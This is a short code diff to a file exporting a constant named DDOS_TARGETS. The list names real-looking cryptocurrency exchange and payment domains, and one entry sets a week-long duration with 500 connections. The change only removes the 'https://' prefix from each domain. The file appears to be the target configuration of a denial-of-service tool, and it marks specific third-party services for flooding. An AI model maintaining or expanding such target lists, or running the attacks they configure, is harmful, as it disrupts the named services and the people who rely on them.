@@ -7,14 +7,14 @@ export const DDOS_TARGETS = [
         duration: '604800s',
         connections: 500
     },
-    'https://cleanbtc.ru',
-    'https://bonkypay.com',
-    'https://changer.club',
-    'https://superchange.net',
-    'https://mine.exchange',
-    'https://platov.co',
-    'https://ww-pay.net',
-    'https://delets.cash',
-    'https://betatransfer.org',
+    'cleanbtc.ru',
+    'bonkypay.com',
+    'changer.club',
+    'superchange.net',
+    'mine.exchange',
+    'platov.co',
+    'ww-pay.net',
+    'delets.cash',
+    'betatransfer.org',
 ]
 
